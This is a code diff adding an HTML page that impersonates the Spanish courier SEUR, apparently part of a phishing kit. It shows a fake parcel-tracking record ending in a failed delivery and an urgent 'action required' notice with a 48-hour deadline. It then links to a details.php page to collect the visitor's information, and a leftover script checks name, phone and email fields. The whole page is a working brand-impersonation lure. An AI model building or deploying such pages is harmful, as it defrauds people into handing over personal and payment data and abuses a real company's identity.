@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="discription" content="Coinbase">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="icon" href="./Assets/imgs/favicon.jpg">
+        <title>SEUR: Envío y transporte de paquetería y mensajería | SEUR</title>
+        <!-- === bootstrap === -->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
+        <!-- == Font-awesome " icon " == -->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+        <!-- == remixicon " icon " == -->
+        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+        <!-- == file style css == -->
+        <link rel="stylesheet" href="./Assets/css/style.css">
+        <script src="./Assets/js/stutes.js"></script>
+    </head>
+    <body>
+
+        <div class="header">
+            <div class="container_header_1 d-flex align-items-center justify-content-between">
+                <div class="part_left d-flex align-items-center">
+                    <div class="logo">
+                        <img src="./Assets/imgs/logo.png" alt="">
+                    </div>
+                    <ul class="d-flex align-items-center ps-0 mb-0">
+                        <li>Enviar</li>
+                        <li>Recibir</li>
+                        <li>Devolver</li>
+                        <li>miSEUR</li>
+                        <li>Empresas</li>
+                        <li>Puntos Pickup</li>
+                        <li>Ayuda</li>
+                    </ul>
+                </div>
+                <div class="part_right d-flex align-items-center">
+                    <ul class="d-flex align-items-center ps-0 mb-0">
+                        <li><img src="./Assets/imgs/icon-search.svg" alt=""></li>
+                        <li><img src="./Assets/imgs/icon-notifications.svg" alt=""></li>
+                        <li class="sm_shows"><img src="./Assets/imgs/icon-user.svg" alt=""></li>
+                    </ul>
+                    <button>Inicia sesión o regístrate</button>
+                    <img src="./Assets/imgs/icon-menu.svg" class="menu" alt="">
+                </div>
+            </div>
+        </div>
+
+        <div class="wrapper_track">
+            <div class="container_track">
+                <ul class="d-flex align-items-center ps-0 mb-0">
+                    <li><a href="">Resultado de la búsqueda</a></li>
+                    <li>/</li>
+                    <li><a href="" class="active">Detalles de seguimiento</a></li>
+                </ul>
+                <div class="box_track">
+                    <div class="ship">
+                        Envío de carga
+                    </div>
+                    <img src="./Assets/imgs/logo.png" style="position: absolute; width:120px; right:40px; top:15px;" alt="">
+                    <div class="number_ship d-flex align-items-center justify-content-between">
+                        <div class="text">
+                            <span>El número de rastreo</span>
+                            <h1 class="mb-0">30364601451 <img src="./Assets/imgs/airplane-dark.svg" alt=""></h1>
+                            <p class="mb-0">Capacidad</p>                            
+                        </div>
+                        <span class="arrival"><img src="./Assets/imgs/arrival-freight.svg" alt=""> Llegada</span>
+                    </div>
+                    <div class="shipment_track_points">
+                        <span>Origen</span>
+                        <div class="track"></div>
+                        <span>Destino</span>
+                    </div>
+                    <div class="wrapper_point d-flex">
+                        <div class="line">
+                            <div class="length"></div>
+                        </div>
+                        <div class="box align-items-start">
+                            <div class="txt text-start">
+                                <span class="sm_show">Creada</span>
+                                <p class="cuntery">Hemos recibido su paquete.</p>
+                                <p class="red">Paquete registrado</p>
+                            </div>
+                            <div class="icon">
+                                <div class="check_image">
+                                    <div class="check active">
+                                        <img src="./Assets/imgs/check.png" width="20px" alt="">
+                                    </div>
+                                </div>
+                                <p class="sm_text mb-0">Creada</p>                                
+                            </div>
+                        </div>
+                        <div class="box">
+                            <div class="txt">
+                                <span></span>
+                                <p class="cuntery">En camino</p>
+                                <p class="red">En tránsito</p>
+                            </div>
+                            <div class="check_image">
+                                <div class="check">
+                                    <img src="./Assets/imgs/check.png" width="20px" alt="">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="box">
+                            <div class="txt">
+                                <span></span>
+                                <p class="cuntery">En salida para entrega</p>
+                                <p class="red">Con Courier</p>
+                            </div>
+                            <div class="check_image">
+                                <img src="./Assets/imgs/stepper-box.webp" class="mt-2" alt="">
+                            </div>
+                        </div>
+                        <div class="box align-items-end">
+                            <div class="txt text-end">
+                                <span class="sm_show">Destino</span>
+                                <p class="cuntery">Intento de entrega fallido.</p>
+                                <p class="red">Entrega fallida</p>
+                            </div>
+                            <div class="icon">
+                                <div class="check_image">
+                                    <div class="check active_disabled">
+                                        <img src="./Assets/imgs/failed.png" width="20" alt="">
+                                    </div>
+                                </div>
+                                <p class="sm_text mb-0">Fallida</p>                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="msg">
+                    <h1>Envío pendiente - Acción requerida</h1>
+                    <p class="mb-2">Acción requerida: Su paquete ha llegado a nuestro centro de distribución, pero aún nos faltan algunos datos para finalizar la entrega.</p>
+                    <b style="color: #949897;">Proporcione la información requerida en la página siguiente para garantizar la entrega de su paquete.</b>
+                    <div class="alert_box mt-3">
+                        <p><b style="color: #949897;">Aviso importante :</b> Tiene 48 horas para completar su información. Si no la recibimos en este plazo, su paquete podría ser devuelto al remitente</p>
+                    </div>
+                    <div class="btns">
+                        <a href="./details.php">Actualizar</a>
+                    </div>                    
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer_1">
+            <div class="part_top">
+                <div class="links">
+                    <div class="link">
+                        <ul>
+                            <span>Enviar paquete <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Envio online</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Envío online con descuento</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Calculadora servicio SEUR 24</li>
+                        </ul>
+                    </div>
+                    <div class="link">
+                        <ul>
+                            <span>Recibir envío <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt="">Seguimiento de Envíos</li>
+                            <li><img src="./Assets/imgs/upload.png" alt="">Entrega interactiva</li>
+                            <li><img src="./Assets/imgs/upload.png" alt="">Recoger en tienda</li>
+                            <li><img src="./Assets/imgs/upload.png" alt="">Preguntas frecuentes</li>
+                        </ul>
+                    </div>
+                    <div class="link">
+                        <ul>
+                            <span>Actualidad <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Fundación SEUR</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Blog SEUR</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Sala de prensa</li>
+                        </ul>
+                    </div>
+                    <div class="link d-flex flex-column">
+                        <div class="media">
+                            <span>Encuéntranos:</span>  
+                            <img src="./Assets/imgs/media.png" alt="">
+                        </div>
+                        <div class="method">
+                            <span>Métodos de pago:</span>  
+                            <ul class="ps-0 mb-0">
+                                <li><img src="./Assets/imgs/p1.svg" alt=""></li>
+                                <li><img src="./Assets/imgs/p2.svg" alt=""></li>
+                                <li><img src="./Assets/imgs/p3.svg" alt=""></li>
+                                <li><img src="./Assets/imgs/p4.svg" alt=""></li>
+                                <li><img src="./Assets/imgs/p5.svg" alt=""></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="links">
+                    <div class="link">
+                        <ul>
+                            <span>Envío internacional <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> ESeguimiento internacional</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Envíos a Europa</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Envíos a Estados Unidos</li>
+                        </ul>
+                    </div>
+                    <div class="link">
+                        <ul>
+                            <span>Empresas <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Acceso a SEUR Pro</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Únete a la red SEUR Pickup</li>
+                        </ul>
+                    </div>
+                    <div class="link">
+                        <ul>
+                            <span>Descubre SEUR <img src="./Assets/imgs/plus.png" alt=""></span>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> SEUR Internacional</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Fulfillment by SEUR</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> SEUR Mensajería</li>
+                            <li><img src="./Assets/imgs/upload.png" alt=""> Trabaja con nosotros</li>
+                        </ul>
+                    </div>
+                    <div class="link">
+                    </div>
+                </div>
+            </div>
+            <div class="part_bottom">
+                <p>Copyright © SEUR 2024</p>
+                <ul>
+                    <li>Política de privacidad y cookies</li>
+                    <li class="slash"></li>
+                    <li>Configuración de cookies</li>
+                    <li class="slash"></li>
+                    <li>Aviso legal</li>
+                    <li class="slash"></li>
+                    <li>Uso fraudulento de la marca</li>
+                    <li class="slash"></li>
+                    <li>Condiciones de transporte</li>
+                    <li class="slash"></li>
+                    <li>Mapa webs</li>
+                </ul>
+                <img src="./Assets/imgs/logo-geopost.png" alt="">
+            </div>
+        </footer>
+
+        
+
+
+
+        <!-- bootstrap -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- script jquery -->
+        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
+        <script src="./Assets/js/script.js"></script>
+        
+        <script>  
+            $("input").keyup(function(){
+              if ($("#f1").val() != "" & $("#f2").val() != "" &  $("#phone").val() != "" & $("#mail").val() != "") {
+                  $(".btn_sub .next").prop("disabled",false);
+                  $(".btn_sub .next").addClass("active");
+              }else{
+                  $(".btn_sub .next").prop("disabled",true);
+                  $(".btn_sub .next").removeClass("active");
+              }
+            });                 
+        </script>
+    </body>
+</html>
